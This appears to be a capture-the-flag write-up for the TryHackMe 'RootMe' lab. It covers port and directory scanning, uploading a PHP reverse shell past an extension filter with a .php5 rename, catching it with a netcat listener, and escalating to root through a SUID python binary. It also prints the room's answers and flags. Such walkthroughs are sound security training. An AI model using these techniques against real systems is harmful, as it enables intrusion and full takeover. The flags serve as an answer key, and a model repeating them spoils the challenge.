## RootMe Machine Report  
  
## Task 2 - Reconnaissance

Lets start with the nmap...

    sudo nmap -p- -sS -sV 10.114.184.45

  

Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-08 13:45 +0000
Nmap scan report for 10.114.184.45

Host is up (0.049s latency).

Not shown: 65533 closed tcp ports (reset)


PORT STATE SERVICE VERSION

22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)

80/tcp open http Apache httpd 2.4.41 ((Ubuntu))

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 30.96 seconds

   

Scan the machine, how many ports are open? 

> 2

  

What version of Apache is running? 

> 2.4.41

  

What service is running on port 22? 

> ssh

  
  

    gobuster - gobuster dir -u http://10.114.184.45/ -w /usr/share/wordlists/dirb/common.txt

  

What is the hidden directory? 

> /panel/

  

## Task 3 - Getting Shell

  

Start a listener

  

    nc -lvnp 443

  
  

Edit the file php reverse shell script on the line 49 and 50 and upload on the hidden page that we found!
[PHP-Reverse-Shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

  

It gives us the message "php files not allowed"

  

We can change the extension to bypass that... lets change it to .php5

  

It worked!!!

  
  

Now that we have uploaded the file we are going to the uploads page and now that we have set our listener we just click on the file...

  

We have reverse a limited shell

  

Now we upgrade the shell

run:

    python -c 'import pty; pty.spawn("/bin/bash")'

  

We need to find the user.txt

run:

    find / -type f -name user.txt 2>/dev/null

  
  

wWith that we found our user.txt, with the cat command we can see what it is inside

  

user.txt : 

> THM{y0u_g0t_a_sh3ll}

  



## Task 4 Privilege escalation

  

Search for files with SUID permission, which file is weird?

  

run:

  

    find / -type f -user root -perm -4000 2>/dev/null

  

answer: 

> usr/bin/python

  

Now we need to find a way to elevante our previlleges to admin so we can see whats inside roots.txt...

  

Since we already found SUID binaries will use GTFOBins to see if any of these binaries can be exploited for privilege escalation

  

run:

  

    python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

  
  

Perfect we have root shell

  

Just list the root directory

  

Command: `ls`

  

root.txt : 

> THM{pr1v1l3g3_3sc4l4t10n}

  

**Machine Pawned**
